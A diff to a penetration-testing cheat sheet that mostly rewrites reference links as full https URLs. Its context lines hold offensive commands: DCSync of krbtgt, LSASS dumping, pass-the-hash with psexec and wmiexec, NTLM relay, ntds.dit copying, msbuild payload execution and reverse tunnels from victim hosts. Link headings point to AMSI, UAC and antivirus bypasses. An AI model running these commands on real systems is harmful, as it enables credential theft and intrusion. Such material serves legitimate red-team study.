+* [http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)
+* [http://www.harmj0y.net/blog/redteaming/domain-trusts-were-not-done-yet/](http://www.harmj0y.net/blog/redteaming/domain-trusts-were-not-done-yet/)
+* [http://www.harmj0y.net/blog/redteaming/domain-trusts-why-you-should-care/](http://www.harmj0y.net/blog/redteaming/domain-trusts-why-you-should-care/)
+* [https://habr.com/ru/company/jetinfosystems/blog/466445/](https://habr.com/ru/company/jetinfosystems/blog/466445/)
 
 Enum foreign users and groups:
 
@@ -1256,8 +1256,8 @@ PowerView3 > Get-DomainForeignUser -Domain megacorp.com
 
 ### sIDHistory/ExtraSids Hopping
 
-* [www.harmj0y.net/blog/redteaming/mimikatz-and-dcsync-and-extrasids-oh-my/](http://www.harmj0y.net/blog/redteaming/mimikatz-and-dcsync-and-extrasids-oh-my/)
-* [www.harmj0y.net/blog/redteaming/the-trustpocalypse/](http://www.harmj0y.net/blog/redteaming/the-trustpocalypse/)
+* [http://www.harmj0y.net/blog/redteaming/mimikatz-and-dcsync-and-extrasids-oh-my/](http://www.harmj0y.net/blog/redteaming/mimikatz-and-dcsync-and-extrasids-oh-my/)
+* [http://www.harmj0y.net/blog/redteaming/the-trustpocalypse/](http://www.harmj0y.net/blog/redteaming/the-trustpocalypse/)
 
 Use PowerView to enumerate domain trusts:
 
@@ -1351,19 +1351,19 @@ mimikatz # lsadump::dcsync /user:megacorp.local\krbtgt /domain:megacorp.local
 
 ### UnD + PrinterBug
 
-* [www.harmj0y.net/blog/redteaming/not-a-security-boundary-breaking-forest-trusts/](https://www.harmj0y.net/blog/redteaming/not-a-security-boundary-breaking-forest-trusts/)
-* [posts.specterops.io/hunting-in-active-directory-unconstrained-delegation-forests-trusts-71f2b33688e1](https://posts.specterops.io/hunting-in-active-directory-unconstrained-delegation-forests-trusts-71f2b33688e1)
-* [github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet#breaking-forest-trusts](https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet#breaking-forest-trusts)
-* [github.com/S3cur3Th1sSh1t/PowerSharpPack/blob/master/PowerSharpBinaries/Invoke-Spoolsample.ps1](https://github.com/S3cur3Th1sSh1t/PowerSharpPack/blob/master/PowerSharpBinaries/Invoke-Spoolsample.ps1)
-* [github.com/BlackDiverX/WinTools/blob/master/SpoolSample-Printerbug/SpoolSample.exe](https://github.com/BlackDiverX/WinTools/blob/master/SpoolSample-Printerbug/SpoolSample.exe)
+* [https://www.harmj0y.net/blog/redteaming/not-a-security-boundary-breaking-forest-trusts/](https://www.harmj0y.net/blog/redteaming/not-a-security-boundary-breaking-forest-trusts/)
+* [https://posts.specterops.io/hunting-in-active-directory-unconstrained-delegation-forests-trusts-71f2b33688e1](https://posts.specterops.io/hunting-in-active-directory-unconstrained-delegation-forests-trusts-71f2b33688e1)
+* [https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet#breaking-forest-trusts](https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet#breaking-forest-trusts)
+* [https://github.com/S3cur3Th1sSh1t/PowerSharpPack/blob/master/PowerSharpBinaries/Invoke-Spoolsample.ps1](https://github.com/S3cur3Th1sSh1t/PowerSharpPack/blob/master/PowerSharpBinaries/Invoke-Spoolsample.ps1)
+* [https://github.com/BlackDiverX/WinTools/blob/master/SpoolSample-Printerbug/SpoolSample.exe](https://github.com/BlackDiverX/WinTools/blob/master/SpoolSample-Printerbug/SpoolSample.exe)
 
 
 
 ### Visualization (yEd)
 
-* [www.harmj0y.net/blog/redteaming/domain-trusts-why-you-should-care/](http://www.harmj0y.net/blog/redteaming/domain-trusts-why-you-should-care/)
-* [github.com/HarmJ0y/TrustVisualizer](https://github.com/HarmJ0y/TrustVisualizer)
-* [www.yworks.com/products/yed](https://www.yworks.com/products/yed)
+* [http://www.harmj0y.net/blog/redteaming/domain-trusts-why-you-should-care/](http://www.harmj0y.net/blog/redteaming/domain-trusts-why-you-should-care/)
+* [https://github.com/HarmJ0y/TrustVisualizer](https://github.com/HarmJ0y/TrustVisualizer)
+* [https://www.yworks.com/products/yed](https://www.yworks.com/products/yed)
 
 ```
 PowerView3 > Invoke-MapDomainTrust | Export-Csv -NoTypeInformation trusts.csv
@@ -1525,8 +1525,8 @@ PS > net localgroup administrators testuser /add
 
 List deleted AD objects (AD recycle bin):
 
-* [activedirectorypro.com/enable-active-directory-recycle-bin-server-2016/](https://activedirectorypro.com/enable-active-directory-recycle-bin-server-2016/)
-* [blog.stealthbits.com/active-directory-object-recovery-recycle-bin/](https://blog.stealthbits.com/active-directory-object-recovery-recycle-bin/)
+* [https://activedirectorypro.com/enable-active-directory-recycle-bin-server-2016/](https://activedirectorypro.com/enable-active-directory-recycle-bin-server-2016/)
+* [https://blog.stealthbits.com/active-directory-object-recovery-recycle-bin/](https://blog.stealthbits.com/active-directory-object-recovery-recycle-bin/)
 
 ```
 PS > Get-ADObject -filter 'isDeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects
@@ -1548,7 +1548,7 @@ PS > Get-ADObject -LDAPFilter "(objectClass=User)" -SearchBase '<DISTINGUISHED_N
 
 ### SeBackupPrivilege
 
-* [github.com/giuliano108/SeBackupPrivilege](https://github.com/giuliano108/SeBackupPrivilege)
+* [https://github.com/giuliano108/SeBackupPrivilege](https://github.com/giuliano108/SeBackupPrivilege)
 
 ```
 wget https://github.com/giuliano108/SeBackupPrivilege/raw/master/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeCmdLets.dll
@@ -1577,15 +1577,15 @@ PS > robocopy /B W:\Windows\NTDS\ntds.dit C:\Users\snovvcrash\Documents\ntds.dit
 
 # Remote Management
 
-* [eventlogxp.com/blog/logon-type-what-does-it-mean/](https://eventlogxp.com/blog/logon-type-what-does-it-mean/)
+* [https://eventlogxp.com/blog/logon-type-what-does-it-mean/](https://eventlogxp.com/blog/logon-type-what-does-it-mean/)
 
 
 
 
 ## RDP
 
-* [syfuhs.net/how-authentication-works-when-you-use-remote-desktop](https://syfuhs.net/how-authentication-works-when-you-use-remote-desktop)
-* [swarm.ptsecurity.com/remote-desktop-services-shadowing/](https://swarm.ptsecurity.com/remote-desktop-services-shadowing/)
+* [https://syfuhs.net/how-authentication-works-when-you-use-remote-desktop](https://syfuhs.net/how-authentication-works-when-you-use-remote-desktop)
+* [https://swarm.ptsecurity.com/remote-desktop-services-shadowing/](https://swarm.ptsecurity.com/remote-desktop-services-shadowing/)
 
 
 
@@ -1609,10 +1609,10 @@ PS > Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Ser
 
 ### Restricted Admin
 
-* [www.kali.org/penetration-testing/passing-hash-remote-desktop/](https://www.kali.org/penetration-testing/passing-hash-remote-desktop/)
-* [blog.ahasayen.com/restricted-admin-mode-for-rdp/](https://blog.ahasayen.com/restricted-admin-mode-for-rdp/)
-* [labs.f-secure.com/blog/undisable/](https://labs.f-secure.com/blog/undisable/)
-* [shellz.club/pass-the-hash-with-rdp-in-2019/](https://shellz.club/pass-the-hash-with-rdp-in-2019/)
+* [https://www.kali.org/penetration-testing/passing-hash-remote-desktop/](https://www.kali.org/penetration-testing/passing-hash-remote-desktop/)
+* [https://blog.ahasayen.com/restricted-admin-mode-for-rdp/](https://blog.ahasayen.com/restricted-admin-mode-for-rdp/)
+* [https://labs.f-secure.com/blog/undisable/](https://labs.f-secure.com/blog/undisable/)
+* [https://shellz.club/pass-the-hash-with-rdp-in-2019/](https://shellz.club/pass-the-hash-with-rdp-in-2019/)
 
 RDP with [PtH](http://www.harmj0y.net/blog/redteaming/pass-the-hash-is-dead-long-live-localaccounttokenfilterpolicy/): RDP needs a plaintext password unless Restricted Admin mode is enabled.
 
@@ -1640,7 +1640,7 @@ PS > (Get-WmiObject -class "Win32_TSGeneralSetting" -Namespace root\cimv2\termin
 
 ### Abusing CredSSP / TSPKG
 
-* [clement.notin.org/blog/2019/07/03/credential-theft-without-admin-or-touching-lsass-with-kekeo-by-abusing-credssp-tspkg-rdp-sso/](https://clement.notin.org/blog/2019/07/03/credential-theft-without-admin-or-touching-lsass-with-kekeo-by-abusing-credssp-tspkg-rdp-sso/)
+* [https://clement.notin.org/blog/2019/07/03/credential-theft-without-admin-or-touching-lsass-with-kekeo-by-abusing-credssp-tspkg-rdp-sso/](https://clement.notin.org/blog/2019/07/03/credential-theft-without-admin-or-touching-lsass-with-kekeo-by-abusing-credssp-tspkg-rdp-sso/)
 
 
 
@@ -1656,15 +1656,15 @@ PS > runas /netonly /user:snovvcrash powershell
 
 ## WinRM / PSRemoting
 
-* [www.bloggingforlogging.com/2018/01/24/demystifying-winrm/](https://www.bloggingforlogging.com/2018/01/24/demystifying-winrm/)
-* [www.powershellmagazine.com/2014/03/06/accidental-sabotage-beware-of-credssp/](https://www.powershellmagazine.com/2014/03/06/accidental-sabotage-beware-of-credssp/)
-* [www.ired.team/offensive-security/credential-access-and-credential-dumping/network-vs-interactive-logons](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/network-vs-interactive-logons)
+* [https://www.bloggingforlogging.com/2018/01/24/demystifying-winrm/](https://www.bloggingforlogging.com/2018/01/24/demystifying-winrm/)
+* [https://www.powershellmagazine.com/2014/03/06/accidental-sabotage-beware-of-credssp/](https://www.powershellmagazine.com/2014/03/06/accidental-sabotage-beware-of-credssp/)
+* [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/network-vs-interactive-logons](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/network-vs-interactive-logons)
 
 
 
 ### evil-winrm.rb
 
-* [github.com/Hackplayers/evil-winrm](https://github.com/Hackplayers/evil-winrm)
+* [https://github.com/Hackplayers/evil-winrm](https://github.com/Hackplayers/evil-winrm)
 
 Install:
 
@@ -1687,7 +1687,7 @@ $ evil-winrm.rb -u snovvcrash -p 'Passw0rd!' -i 127.0.0.1 -s `pwd` -e `pwd`
 
 ## SMB (PsExec)
 
-* [www.contextis.com/us/blog/lateral-movement-a-deep-look-into-psexec](https://www.contextis.com/us/blog/lateral-movement-a-deep-look-into-psexec)
+* [https://www.contextis.com/us/blog/lateral-movement-a-deep-look-into-psexec](https://www.contextis.com/us/blog/lateral-movement-a-deep-look-into-psexec)
 
 
 
@@ -1703,7 +1703,7 @@ $ psexec.py -hashes :6bb872d8a9aee9fd6ed2265c8b486490 snovvcrash@127.0.0.1
 
 ## WMI
 
-* [www.ethicalhacker.net/features/root/wmi-101-for-pentesters/](https://www.ethicalhacker.net/features/root/wmi-101-for-pentesters/)
+* [https://www.ethicalhacker.net/features/root/wmi-101-for-pentesters/](https://www.ethicalhacker.net/features/root/wmi-101-for-pentesters/)
 
 
 
@@ -1729,7 +1729,7 @@ $ wmiexec.py -hashes :6bb872d8a9aee9fd6ed2265c8b486490 snovvcrash@127.0.0.1
 
 ### comsvcs.dll
 
-* [www.ired.team/offensive-security/credential-access-and-credential-dumping/dump-credentials-from-lsass-process-without-mimikatz#comsvcs-dll](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dump-credentials-from-lsass-process-without-mimikatz#comsvcs-dll)
+* [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dump-credentials-from-lsass-process-without-mimikatz#comsvcs-dll](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dump-credentials-from-lsass-process-without-mimikatz#comsvcs-dll)
 
 ```
 PS C:\Windows\System32 > Get-Process lsass
@@ -1740,8 +1740,8 @@ PS C:\Windows\System32 > .\rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDum
 
 ### ProcDump
 
-* [docs.microsoft.com/en-us/sysinternals/downloads/procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump)
-* [download.sysinternals.com/files/Procdump.zip](https://download.sysinternals.com/files/Procdump.zip)
+* [https://docs.microsoft.com/en-us/sysinternals/downloads/procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump)
+* [https://download.sysinternals.com/files/Procdump.zip](https://download.sysinternals.com/files/Procdump.zip)
 
 Dump and parse:
 
@@ -1767,7 +1767,7 @@ $ grep -P 'Username: ' lsass-pypykatz.minidump -A4 | grep -e Username -e Domain 
 
 ### pypykatz
 
-* [skelsec.medium.com/duping-av-with-handles-537ef985eb03](https://skelsec.medium.com/duping-av-with-handles-537ef985eb03)
+* [https://skelsec.medium.com/duping-av-with-handles-537ef985eb03](https://skelsec.medium.com/duping-av-with-handles-537ef985eb03)
 
 
 
@@ -1886,8 +1886,8 @@ PS > ls -fo C:\Users\snovvcrash\AppData\Local\Microsoft\Credentials\ (%localappd
 
 ## Obfuscate Mimikatz
 
-* [s3cur3th1ssh1t.github.io/Bypass-AMSI-by-manual-modification-part-II/](https://s3cur3th1ssh1t.github.io/Bypass-AMSI-by-manual-modification-part-II/)
-* [s3cur3th1ssh1t.github.io/Building-a-custom-Mimikatz-binary/](https://s3cur3th1ssh1t.github.io/Building-a-custom-Mimikatz-binary/)
+* [https://s3cur3th1ssh1t.github.io/Bypass-AMSI-by-manual-modification-part-II/](https://s3cur3th1ssh1t.github.io/Bypass-AMSI-by-manual-modification-part-II/)
+* [https://s3cur3th1ssh1t.github.io/Building-a-custom-Mimikatz-binary/](https://s3cur3th1ssh1t.github.io/Building-a-custom-Mimikatz-binary/)
 
 
 
@@ -1895,8 +1895,8 @@ PS > ls -fo C:\Users\snovvcrash\AppData\Local\Microsoft\Credentials\ (%localappd
 
 # NTLM
 
-* [en.hackndo.com/ntlm-relay/](https://en.hackndo.com/ntlm-relay/)
-* [blog.redforce.io/windows-authentication-and-attacks-part-1-ntlm/](https://blog.redforce.io/windows-authentication-and-attacks-part-1-ntlm/)
+* [https://en.hackndo.com/ntlm-relay/](https://en.hackndo.com/ntlm-relay/)
+* [https://blog.redforce.io/windows-authentication-and-attacks-part-1-ntlm/](https://blog.redforce.io/windows-authentication-and-attacks-part-1-ntlm/)
 
 
 
@@ -1915,9 +1915,9 @@ PS > ls -fo C:\Users\snovvcrash\AppData\Local\Microsoft\Credentials\ (%localappd
 <Username>:<Domain>:<Server_Challenge>:<LMv2_Response>:<NTv2_Response>
 ```
 
-* [github.com/lgandx/Responder/blob/eb449bb061a8eb3944b96b157de73dea444ec46b/servers/SMB.py#L149](https://github.com/lgandx/Responder/blob/eb449bb061a8eb3944b96b157de73dea444ec46b/servers/SMB.py#L149)
-* [ru.wikipedia.org/wiki/NTLMv2#NTLMv2](https://ru.wikipedia.org/wiki/NTLMv2#NTLMv2)
-* [www.ivoidwarranties.tech/posts/pentesting-tuts/responder/cheatsheet/](https://www.ivoidwarranties.tech/posts/pentesting-tuts/responder/cheatsheet/)
+* [https://github.com/lgandx/Responder/blob/eb449bb061a8eb3944b96b157de73dea444ec46b/servers/SMB.py#L149](https://github.com/lgandx/Responder/blob/eb449bb061a8eb3944b96b157de73dea444ec46b/servers/SMB.py#L149)
+* [https://ru.wikipedia.org/wiki/NTLMv2#NTLMv2](https://ru.wikipedia.org/wiki/NTLMv2#NTLMv2)
+* [https://www.ivoidwarranties.tech/posts/pentesting-tuts/responder/cheatsheet/](https://www.ivoidwarranties.tech/posts/pentesting-tuts/responder/cheatsheet/)
 * Andrei Miroshnikov. Windows Security Monitoring: Scenarios and Patterns, Part III, pp. 330-333.
 
 
@@ -1925,15 +1925,15 @@ PS > ls -fo C:\Users\snovvcrash\AppData\Local\Microsoft\Credentials\ (%localappd
 
 ## NTLM Relay
 
-* [blog.fox-it.com/2017/05/09/relaying-credentials-everywhere-with-ntlmrelayx/](https://blog.fox-it.com/2017/05/09/relaying-credentials-everywhere-with-ntlmrelayx/)
-* [blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
-* [www.secureauth.com/blog/playing-with-relayed-credentials/](https://www.secureauth.com/blog/playing-with-relayed-credentials/)
-* [intrinium.com/smb-relay-attack-tutorial/](https://intrinium.com/smb-relay-attack-tutorial/)
-* [www.sans.org/blog/smb-relay-demystified-and-ntlmv2-pwnage-with-python/](https://www.sans.org/blog/smb-relay-demystified-and-ntlmv2-pwnage-with-python/)
-* [byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html](https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html)
-* [hunter2.gitbook.io/darthsidious/execution/responder-with-ntlm-relay-and-empire](https://hunter2.gitbook.io/darthsidious/execution/responder-with-ntlm-relay-and-empire)
-* [www.blackhillsinfosec.com/an-smb-relay-race-how-to-exploit-llmnr-and-smb-message-signing-for-fun-and-profit/](https://www.blackhillsinfosec.com/an-smb-relay-race-how-to-exploit-llmnr-and-smb-message-signing-for-fun-and-profit/)
-* [clement.notin.org/blog/2020/11/16/ntlm-relay-of-adws-connections-with-impacket/](https://clement.notin.org/blog/2020/11/16/ntlm-relay-of-adws-connections-with-impacket/)
+* [https://blog.fox-it.com/2017/05/09/relaying-credentials-everywhere-with-ntlmrelayx/](https://blog.fox-it.com/2017/05/09/relaying-credentials-everywhere-with-ntlmrelayx/)
+* [https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
+* [https://www.secureauth.com/blog/playing-with-relayed-credentials/](https://www.secureauth.com/blog/playing-with-relayed-credentials/)
+* [https://intrinium.com/smb-relay-attack-tutorial/](https://intrinium.com/smb-relay-attack-tutorial/)
+* [https://www.sans.org/blog/smb-relay-demystified-and-ntlmv2-pwnage-with-python/](https://www.sans.org/blog/smb-relay-demystified-and-ntlmv2-pwnage-with-python/)
+* [https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html](https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html)
+* [https://hunter2.gitbook.io/darthsidious/execution/responder-with-ntlm-relay-and-empire](https://hunter2.gitbook.io/darthsidious/execution/responder-with-ntlm-relay-and-empire)
+* [https://www.blackhillsinfosec.com/an-smb-relay-race-how-to-exploit-llmnr-and-smb-message-signing-for-fun-and-profit/](https://www.blackhillsinfosec.com/an-smb-relay-race-how-to-exploit-llmnr-and-smb-message-signing-for-fun-and-profit/)
+* [https://clement.notin.org/blog/2020/11/16/ntlm-relay-of-adws-connections-with-impacket/](https://clement.notin.org/blog/2020/11/16/ntlm-relay-of-adws-connections-with-impacket/)
 
 Generate relay list with cme and enumerate local admins when relaying
 
@@ -1948,8 +1948,8 @@ $ sudo ntlmrelayx.py -smb2support --no-http-server -tf out.txt --enum-local-admi
 
 # ExecutionPolicy Bypass
 
-* [blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)
-* [bestestredteam.com/2019/01/27/powershell-execution-policy-bypass/](https://bestestredteam.com/2019/01/27/powershell-execution-policy-bypass/)
+* [https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)
+* [https://bestestredteam.com/2019/01/27/powershell-execution-policy-bypass/](https://bestestredteam.com/2019/01/27/powershell-execution-policy-bypass/)
 
 
 
@@ -1958,9 +1958,9 @@ $ sudo ntlmrelayx.py -smb2support --no-http-server -tf out.txt --enum-local-admi
 # AMSI Bypass
 
 * [AMSI.fail](https://amsi.fail/)
-* [github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell)
-* [www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/](https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/)
-* [s3cur3th1ssh1t.github.io/Bypass_AMSI_by_manual_modification/](https://s3cur3th1ssh1t.github.io/Bypass_AMSI_by_manual_modification/)
+* [https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell)
+* [https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/](https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/)
+* [https://s3cur3th1ssh1t.github.io/Bypass_AMSI_by_manual_modification/](https://s3cur3th1ssh1t.github.io/Bypass_AMSI_by_manual_modification/)
 
 
 
@@ -2041,8 +2041,8 @@ Exec and get a shell ("requires an interactive window station"):
 PS > cmd /c C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe
 ```
 
-* [egre55.github.io/system-properties-uac-bypass](https://egre55.github.io/system-properties-uac-bypass)
-* [www.youtube.com/watch?v=krC5j1Ab44I&t=3570s](https://www.youtube.com/watch?v=krC5j1Ab44I&t=3570s)
+* [https://egre55.github.io/system-properties-uac-bypass](https://egre55.github.io/system-properties-uac-bypass)
+* [https://www.youtube.com/watch?v=krC5j1Ab44I&t=3570s](https://www.youtube.com/watch?v=krC5j1Ab44I&t=3570s)
 
 
 
@@ -2061,7 +2061,7 @@ PS > Bypass-UAC
 
 ## Bypass-UAC
 
-* [github.com/FuzzySecurity/PowerShell-Suite/tree/master/Bypass-UAC](https://github.com/FuzzySecurity/PowerShell-Suite/tree/master/Bypass-UAC)
+* [https://github.com/FuzzySecurity/PowerShell-Suite/tree/master/Bypass-UAC](https://github.com/FuzzySecurity/PowerShell-Suite/tree/master/Bypass-UAC)
 
 
 
@@ -2069,7 +2069,7 @@ PS > Bypass-UAC
 
 # AppLocker Bypass
 
-* [github.com/api0cradle/UltimateAppLockerByPassList](https://github.com/api0cradle/UltimateAppLockerByPassList)
+* [https://github.com/api0cradle/UltimateAppLockerByPassList](https://github.com/api0cradle/UltimateAppLockerByPassList)
 
 
 
@@ -2077,12 +2077,12 @@ PS > Bypass-UAC
 
 # AV Bypass
 
-* [hacker.house/lab/windows-defender-bypassing-for-meterpreter/](https://hacker.house/lab/windows-defender-bypassing-for-meterpreter/)
-* [codeby.net/threads/meterpreter-snova-v-dele-100-fud-with-metasploit-5.66730/](https://codeby.net/threads/meterpreter-snova-v-dele-100-fud-with-metasploit-5.66730/)
-* [github.com/phackt/stager.dll](https://github.com/phackt/stager.dll)
-* [hausec.com/2019/02/09/suck-it-windows-defender/]https://hausec.com/2019/02/09/suck-it-windows-defender/)
-* [medium.com/securebit/bypassing-av-through-metasploit-loader-32-bit-6d62930151ad](https://medium.com/securebit/bypassing-av-through-metasploit-loader-32-bit-6d62930151ad)
-* [medium.com/securebit/bypassing-av-through-metasploit-loader-64-bit-9abe55e3e0c8](https://medium.com/securebit/bypassing-av-through-metasploit-loader-64-bit-9abe55e3e0c8)
+* [https://hacker.house/lab/windows-defender-bypassing-for-meterpreter/](https://hacker.house/lab/windows-defender-bypassing-for-meterpreter/)
+* [https://codeby.net/threads/meterpreter-snova-v-dele-100-fud-with-metasploit-5.66730/](https://codeby.net/threads/meterpreter-snova-v-dele-100-fud-with-metasploit-5.66730/)
+* [https://github.com/phackt/stager.dll](https://github.com/phackt/stager.dll)
+* [https://hausec.com/2019/02/09/suck-it-windows-defender/](https://hausec.com/2019/02/09/suck-it-windows-defender/)
+* [https://medium.com/securebit/bypassing-av-through-metasploit-loader-32-bit-6d62930151ad](https://medium.com/securebit/bypassing-av-through-metasploit-loader-32-bit-6d62930151ad)
+* [https://medium.com/securebit/bypassing-av-through-metasploit-loader-64-bit-9abe55e3e0c8](https://medium.com/securebit/bypassing-av-through-metasploit-loader-64-bit-9abe55e3e0c8)
 
 
 
@@ -2130,8 +2130,8 @@ Exec with `msbuild.exe` and get a shell:
 PS > cmd /c C:\Windows\Microsoft.NET\framework\v4.0.30319\msbuild.exe payload.xml
 ```
 
-* [github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
-* [www.youtube.com/watch?v=krC5j1Ab44I&t=3730s](https://www.youtube.com/watch?v=krC5j1Ab44I&t=3730s)
+* [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
+* [https://www.youtube.com/watch?v=krC5j1Ab44I&t=3730s](https://www.youtube.com/watch?v=krC5j1Ab44I&t=3730s)
 
 
 
@@ -2155,16 +2155,16 @@ $ ./build_x64_go.sh output/go_symmetric_rev.exe.go ebowla-rev.exe [--hidden] && 
 
 ## Invoke-Obfuscation
 
-* [github.com/danielbohannon/Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation)
-* [www.danielbohannon.com/blog-1/2017/12/2/the-invoke-obfuscation-usage-guide](https://www.danielbohannon.com/blog-1/2017/12/2/the-invoke-obfuscation-usage-guide)
+* [https://github.com/danielbohannon/Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation)
+* [https://www.danielbohannon.com/blog-1/2017/12/2/the-invoke-obfuscation-usage-guide](https://www.danielbohannon.com/blog-1/2017/12/2/the-invoke-obfuscation-usage-guide)
 
 
 
 
 ## Out-EncryptedScript.ps1
 
-* [github.com/PowerShellMafia/PowerSploit/blob/master/ScriptModification/Out-EncryptedScript.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/ScriptModification/Out-EncryptedScript.ps1)
-* [powersploit.readthedocs.io/en/latest/ScriptModification/Out-EncryptedScript/](https://powersploit.readthedocs.io/en/latest/ScriptModification/Out-EncryptedScript/)
+* [https://github.com/PowerShellMafia/PowerSploit/blob/master/ScriptModification/Out-EncryptedScript.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/ScriptModification/Out-EncryptedScript.ps1)
+* [https://powersploit.readthedocs.io/en/latest/ScriptModification/Out-EncryptedScript/](https://powersploit.readthedocs.io/en/latest/ScriptModification/Out-EncryptedScript/)
 
 ```
 PS > Out-EncryptedScript .\script.ps1 $(ConvertTo-SecureString 'Passw0rd!' -AsPlainText -Force) s4lt -FilePath .\evil.ps1
@@ -2264,8 +2264,8 @@ $ vi ~/.msf4/modules/exploits/linux/http/p.rb
 
 # Information Gathering
 
-* [pentest-tools.com/home](https://pentest-tools.com/home)
-* [hackertarget.com/ip-tools/](https://hackertarget.com/ip-tools/)
+* [https://pentest-tools.com/home](https://pentest-tools.com/home)
+* [https://hackertarget.com/ip-tools/](https://hackertarget.com/ip-tools/)
 
 
 
@@ -2284,7 +2284,7 @@ site:example.com ext:(php | asp | aspx)
 
 ## Autonomous Systems
 
-* [hackware.ru/?p=9245](https://hackware.ru/?p=9245)
+* [https://hackware.ru/?p=9245](https://hackware.ru/?p=9245)
 
 
 
@@ -2340,7 +2340,7 @@ $ dig [@dns.example.com] example.com [{any,a,mx,ns,soa,txt,...}]
 $ dig -x example.com [+short] [+timeout=1]
 ```
 
-* [viewdns.info/reverseip/](https://viewdns.info/reverseip/)
+* [https://viewdns.info/reverseip/](https://viewdns.info/reverseip/)
 
 Zone transfer:
 
@@ -2438,9 +2438,9 @@ QUIT
 
 ## IKE
 
-* [xakep.ru/2015/05/13/ipsec-security-flaws/](https://xakep.ru/2015/05/13/ipsec-security-flaws/)
-* [book.hacktricks.xyz/pentesting/ipsec-ike-vpn-pentesting](https://book.hacktricks.xyz/pentesting/ipsec-ike-vpn-pentesting)
-* [www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/cracking-ike-missionimprobable-part-1/](https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/cracking-ike-missionimprobable-part-1/)
+* [https://xakep.ru/2015/05/13/ipsec-security-flaws/](https://xakep.ru/2015/05/13/ipsec-security-flaws/)
+* [https://book.hacktricks.xyz/pentesting/ipsec-ike-vpn-pentesting](https://book.hacktricks.xyz/pentesting/ipsec-ike-vpn-pentesting)
+* [https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/cracking-ike-missionimprobable-part-1/](https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/cracking-ike-missionimprobable-part-1/)
 
 Generate list of all transform-sets:
 
@@ -2576,7 +2576,7 @@ bob@victim:$ ./chisel client 10.10.13.37:8000 R:socks
 
 ## revsocks
 
-* [github.com/kost/revsocks](https://github.com/kost/revsocks)
+* [https://github.com/kost/revsocks](https://github.com/kost/revsocks)
 
 ```
 root@kali:$ ./revsocks -listen :8000 -socks 127.0.0.1:1080 -pass 'Passw0rd!'
@@ -2588,14 +2588,14 @@ bob@victim:$ ./revsocks -connect 10.14.14.3:8000 -pass 'Passw0rd!'
 
 ## TCP over RDP
 
-* [ijustwannared.team/2019/11/07/c2-over-rdp-virtual-channels/](https://ijustwannared.team/2019/11/07/c2-over-rdp-virtual-channels/)
+* [https://ijustwannared.team/2019/11/07/c2-over-rdp-virtual-channels/](https://ijustwannared.team/2019/11/07/c2-over-rdp-virtual-channels/)
 
 
 
 ### xfreerdp + rdp2tcp
 
-* [github.com/V-E-O/rdp2tcp](https://github.com/V-E-O/rdp2tcp)
-* [github.com/NotMedic/rdp-tunnel](https://github.com/NotMedic/rdp-tunnel)
+* [https://github.com/V-E-O/rdp2tcp](https://github.com/V-E-O/rdp2tcp)
+* [https://github.com/NotMedic/rdp-tunnel](https://github.com/NotMedic/rdp-tunnel)
 
 ```
 $ xfreerdp /u:snovvcrash /p:'Passw0rd!' /d:megacorp.local /v:PC01.megacorp.local /dynamic-resolution /drive:www,/home/snovvcrash/www +clipboard /rdp2tcp:/home/snovvcrash/tools/rdp-tunnel/rdp2tcp
@@ -2615,7 +2615,7 @@ $ python rdp2tcp.py add forward 127.0.0.1 9001 127.0.0.1 9002
 
 Reverse tunnel web access via SOCKS proxy:
 
